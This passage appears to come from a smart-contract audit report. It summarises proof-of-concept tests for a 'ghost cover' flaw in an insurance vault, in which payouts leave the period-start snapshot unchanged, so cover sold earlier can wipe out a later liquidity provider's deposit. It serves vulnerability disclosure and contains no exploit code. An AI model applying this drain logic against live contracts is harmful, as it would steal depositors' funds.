* Produces an unrecoverable shortfall of **1800 USD (90% default)** on legitimate, settled cover obligations.
  {% endstep %}

{% step %}

#### `test_PoC_lateLpIsSlashedToHonorGhostCover` (Direct User Fund Drain)

* A subsequent LP deposits 800 USDC in Period 1 after the ghost cover is sold.
* When the claim arrives, the payout extracts the entire 1000 USDC from the vault.
* The late LP suffers a **100% total loss of their deposit** (`convertToAssets` yields 0) to honor ghost cover sold before their arrival.
  {% endstep %}

{% step %}

#### `test_PoC_snapshotIntentIsOneSided` (Root Cause Asymmetry Verification)

Empirically tracks state checkpoints to prove that while mid-period deposits correctly do not inflate the period-start snapshot, physical payouts transfer ERC20 tokens out of the vault without adjusting the snapshot, creating the capacity desynchronization.
{% endstep %}
{% endstepper %}
